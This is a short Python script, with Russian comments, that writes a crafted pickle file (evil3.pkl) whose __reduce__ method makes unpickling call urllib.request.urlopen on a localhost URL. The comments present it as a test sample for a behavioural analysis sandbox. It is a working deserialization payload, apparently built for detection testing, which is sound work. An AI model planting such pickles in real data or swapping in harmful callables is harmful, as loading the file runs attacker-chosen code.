import pickle
import urllib.request

class NetworkPayload:
    def __reduce__(self):
        # Используем встроенный urllib.request.urlopen для отправки GET-запроса.
        # В реальном тесте замените URL на ваш внутренний canary-токен или локальный хост (например, http://127.0.0.1:8080)
        target_url = "http://localhost:8000/sandbox_test_ping"
        
        # Передаем функцию urlopen и её аргумент. 
        # При десериализации процесс попытается установить сетевое соединение.
        return (urllib.request.urlopen, (target_url,))

# Генерация тестового байт-кода
bd = pickle.dumps(NetworkPayload())

# Передайте эти байты в вашу систему поведенческого анализа через pickle.loads(binary_payload)
with open("./evil3.pkl", "wb") as f:
    f.write(bd)
